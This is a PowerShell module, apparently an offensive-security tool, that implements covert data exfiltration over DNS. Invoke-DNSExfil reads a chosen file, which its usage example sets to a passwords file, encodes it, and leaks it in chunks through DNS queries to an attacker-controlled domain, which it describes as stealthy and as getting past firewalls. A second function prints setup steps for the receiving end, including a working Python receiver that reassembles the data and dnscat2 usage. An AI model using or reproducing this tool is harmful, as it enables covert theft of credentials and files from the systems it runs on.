<#
.SYNOPSIS
    Exfiltrate data via DNS queries

.DESCRIPTION
    Encodes data in DNS subdomain queries, which are typically allowed through
    firewalls and rarely inspected. Slower than HTTP but very stealthy.

    Data is base64 encoded and split into DNS label-sized chunks.

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER FilePath
    Path to file to exfiltrate

.PARAMETER Data
    Raw data string to exfiltrate

.PARAMETER Domain
    Your controlled domain (e.g., exfil.yourdomain.com)

.PARAMETER ChunkSize
    Size of DNS labels (max 63, recommend 32 for safety)

.PARAMETER Delay
    Delay between queries in milliseconds

.EXAMPLE
    Invoke-DNSExfil -FilePath C:\secrets\passwords.txt -Domain "exfil.yourdomain.com"
    Invoke-DNSExfil -Data "secret data" -Domain "exfil.yourdomain.com" -Delay 500
#>

function Invoke-DNSExfil {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'File')]
        [string]$FilePath,

        [Parameter(ParameterSetName = 'Data')]
        [string]$Data,

        [Parameter(Mandatory)]
        [string]$Domain,

        [int]$ChunkSize = 32,

        [int]$Delay = 100,

        [switch]$UseNslookup
    )

    Write-Host @"

============================================================
  DNS DATA EXFILTRATION
============================================================
  Domain: $Domain
  Chunk Size: $ChunkSize characters
  Delay: $Delay ms between queries
============================================================

"@ -ForegroundColor Cyan

    # Get data to exfiltrate
    $rawData = if ($FilePath) {
        if (-not (Test-Path $FilePath)) {
            Write-Error "File not found: $FilePath"
            return
        }
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        [Convert]::ToBase64String($bytes)
    }
    else {
        [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
    }

    # Make base64 DNS-safe (replace + and / with - and _)
    $encodedData = $rawData -replace '\+', '-' -replace '/', '_' -replace '=', ''

    $totalLength = $encodedData.Length
    $totalChunks = [Math]::Ceiling($totalLength / $ChunkSize)

    Write-Host "[*] Data size: $totalLength characters ($totalChunks chunks)" -ForegroundColor Yellow
    Write-Host "[*] Estimated time: $([math]::Round(($totalChunks * $Delay) / 1000 / 60, 2)) minutes" -ForegroundColor Yellow

    # Send start marker
    $sessionId = [guid]::NewGuid().ToString().Substring(0, 8)
    $startQuery = "start-$sessionId-$totalChunks.$Domain"

    Write-Host "[*] Starting session: $sessionId" -ForegroundColor Yellow

    try {
        if ($UseNslookup) {
            nslookup $startQuery 2>$null | Out-Null
        }
        else {
            Resolve-DnsName $startQuery -ErrorAction SilentlyContinue | Out-Null
        }
    }
    catch { }

    # Send data chunks
    $chunkNum = 0
    for ($i = 0; $i -lt $encodedData.Length; $i += $ChunkSize) {
        $chunkNum++
        $chunk = $encodedData.Substring($i, [Math]::Min($ChunkSize, $encodedData.Length - $i))

        # Format: seq.data.session.domain
        $query = "$chunkNum.$chunk.$sessionId.$Domain"

        try {
            if ($UseNslookup) {
                nslookup $query 2>$null | Out-Null
            }
            else {
                Resolve-DnsName $query -ErrorAction SilentlyContinue | Out-Null
            }
        }
        catch { }

        Write-Progress -Activity "Exfiltrating via DNS" -Status "Chunk $chunkNum of $totalChunks" -PercentComplete (($chunkNum / $totalChunks) * 100)

        Start-Sleep -Milliseconds $Delay
    }

    # Send end marker
    $endQuery = "end-$sessionId.$Domain"

    try {
        if ($UseNslookup) {
            nslookup $endQuery 2>$null | Out-Null
        }
        else {
            Resolve-DnsName $endQuery -ErrorAction SilentlyContinue | Out-Null
        }
    }
    catch { }

    Write-Progress -Activity "Exfiltrating via DNS" -Completed
    Write-Host "[+] Exfiltration complete: $totalChunks chunks sent" -ForegroundColor Green

    Write-Host @"

[*] TO REASSEMBLE ON YOUR SERVER:
    1. Capture DNS queries to $Domain
    2. Extract the data portions from subdomains
    3. Reorder by sequence number
    4. Concatenate and base64 decode

    Session ID: $sessionId
"@ -ForegroundColor Cyan
}

function New-DNSExfilServer {
    <#
    .SYNOPSIS
        Instructions for setting up DNS exfil receiver

    .DESCRIPTION
        Provides instructions for setting up a DNS server to receive
        exfiltrated data.

    .EXAMPLE
        New-DNSExfilServer
    #>
    [CmdletBinding()]
    param()

    Write-Host @"

============================================================
  DNS EXFILTRATION SERVER SETUP
============================================================

Option 1: Using dnscat2 (Recommended)
--------------------------------------
# On your server:
ruby dnscat2.rb exfil.yourdomain.com

# Set NS record for exfil.yourdomain.com pointing to your server


Option 2: Simple Python DNS Logger
----------------------------------
# Install: pip install dnslib

from dnslib.server import DNSServer, DNSLogger, BaseResolver
from dnslib import RR, QTYPE, A
import base64

class ExfilResolver(BaseResolver):
    def __init__(self):
        self.sessions = {}

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)

        # Log the query
        print(f"Received: {qname}")

        # Parse and store data
        parts = qname.rstrip('.').split('.')
        if len(parts) >= 3:
            if parts[0].startswith('start-'):
                session = parts[0].split('-')[1]
                chunks = int(parts[0].split('-')[2])
                self.sessions[session] = {'total': chunks, 'data': {}}
                print(f"New session: {session}, expecting {chunks} chunks")

            elif parts[0].isdigit():
                seq = int(parts[0])
                data = parts[1]
                session = parts[2]
                if session in self.sessions:
                    self.sessions[session]['data'][seq] = data
                    print(f"Session {session}: chunk {seq}")

            elif parts[0].startswith('end-'):
                session = parts[0].split('-')[1]
                if session in self.sessions:
                    # Reassemble
                    chunks = self.sessions[session]['data']
                    full_data = ''.join([chunks[i] for i in sorted(chunks.keys())])
                    # Reverse DNS-safe encoding
                    full_data = full_data.replace('-', '+').replace('_', '/')
                    # Add padding
                    padding = 4 - (len(full_data) % 4)
                    if padding != 4:
                        full_data += '=' * padding
                    decoded = base64.b64decode(full_data)
                    print(f"Decoded data: {decoded}")

        reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4")))
        return reply

if __name__ == '__main__':
    resolver = ExfilResolver()
    server = DNSServer(resolver, port=53, address='0.0.0.0')
    server.start()


Option 3: tcpdump + Post-Processing
-----------------------------------
# Capture DNS queries:
tcpdump -i eth0 -w dns.pcap 'udp port 53'

# Extract with tshark:
tshark -r dns.pcap -T fields -e dns.qry.name | grep yourdomain.com

============================================================

"@ -ForegroundColor Cyan
}

# Export functions
Export-ModuleMember -Function Invoke-DNSExfil, New-DNSExfilServer
